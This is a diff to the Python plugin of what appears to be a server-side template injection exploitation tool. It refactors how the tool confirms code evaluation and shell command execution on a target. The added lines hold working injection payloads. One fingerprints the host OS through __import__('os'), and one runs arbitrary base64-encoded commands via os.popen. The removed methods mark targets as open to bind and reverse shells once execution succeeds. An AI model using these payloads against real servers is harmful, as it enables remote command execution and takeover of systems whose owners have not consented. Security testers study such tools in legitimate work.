@@ -39,11 +39,15 @@ class Python(Plugin):
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate': """%(code)s"""
+                'evaluate': """%(code)s""",
+                'test_os': """'-'.join([__import__('os').name, __import__('sys').platform])""",
+                'test_os_expected': '^[\w-]+$'
             },
             'execute' : {
                 'call': 'evaluate',
-                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
+                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2] 
             },
             'blind' : {
                 'call': 'evaluate_blind',
@@ -81,33 +85,6 @@ class Python(Plugin):
         ])
 
     language = 'python'
-
-    def rendered_detected(self):
-
-        os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-        
-        # Blind has been detected so code has been already evaluated
-        self.set('evaluate_blind', self.language)
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
 
 
 ctx_closures = {
